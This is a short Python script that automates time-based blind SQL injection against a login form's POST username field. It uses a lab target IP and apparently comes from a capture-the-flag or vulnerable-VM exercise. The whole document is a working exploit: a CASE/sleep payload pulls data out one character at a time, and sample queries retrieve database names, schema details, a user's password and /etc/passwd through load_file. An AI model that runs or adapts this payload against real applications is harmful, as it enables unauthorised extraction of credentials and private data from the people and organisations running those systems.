#Script to get result using blindsql in post method
#Test with sleep(5) to see whehter blind sql is injectable, if so remember to replace < ' sleep(5) -- - > with general_command() mentioned below.

#Some sample sql_command
#1:"current_user()"
#2:"database()"
#3:"(select password from Users where id=1)"
#4:"(Select table_name from information_schema.tables limit +'k'+,1)" //change k
#5:"(Select column_name from information_schema.columns limit+'k'+,1)" // change k
#6:"(Select column_name from information_schema.columns where table_name='Users' limit k,1)" //change k
#7:"(select load_file('/etc/passwd'))"


import requests
import time
from datetime import datetime

URL='http://192.168.112.133:1337/978345210/index.php'  #change url

def general_command():
	return "'+or+case+ascii(substr("+sql_command+","+str(i)+",1))+when+'"+str(j)+"'+then+sleep(1)+else+sleep(0)+end+--+-" 

sql_command="(database())" # replace this sql commands, you can use one from above sample


filtered = ''
flag=0
for i in range(1,2000):
	for j in range(1,127):
		Data="username=admi"+general_command()+"&password=admin&submit=+Login+" # You have to set the post paramaters here.  
		req = requests.Request('POST',URL,headers={"Content-Type": "application/x-www-form-urlencoded"},data=Data)
		prepared = req.prepare()
		s = requests.Session()
		start = datetime.now()
		s.send(prepared)
		elapsed_time = str(datetime.now() - start)
		time1=elapsed_time.split(":")[2]
		time2=time1.split(".")[0]
		if int(time2) > 4: 
			filtered=filtered+chr(j)
			print filtered
			flag=1
	if flag==0:
		break;
	else:
	   flag=0
print filtered



